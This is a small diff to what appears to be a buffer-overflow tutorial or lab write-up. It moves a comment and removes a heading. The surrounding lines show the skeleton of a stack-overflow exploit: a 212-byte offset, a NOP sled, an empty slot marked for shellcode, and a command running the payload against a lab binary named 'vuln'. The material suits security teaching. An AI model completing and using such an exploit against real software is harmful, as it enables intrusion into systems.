@@ -137,8 +137,8 @@ import sys
 
 # 70 Bytes de shellcode (buff)
 buf =  b""
-# Insert the shellcode here!
 
+# Insert the shellcode here!
 
 offset = 212            # Offset obtained at the beginning
 nops = b"\x90" * 100    # Add some NOPs to secure the execution
@@ -175,10 +175,6 @@ sys.stdout.buffer.write(payload)
 
 ## Run the exploit
 ./vuln $(python3 solution_exploit.py)
-
-
-
-## Now let's build the exploit
 
 Check the [solution file](./solution_exploit.py)
 
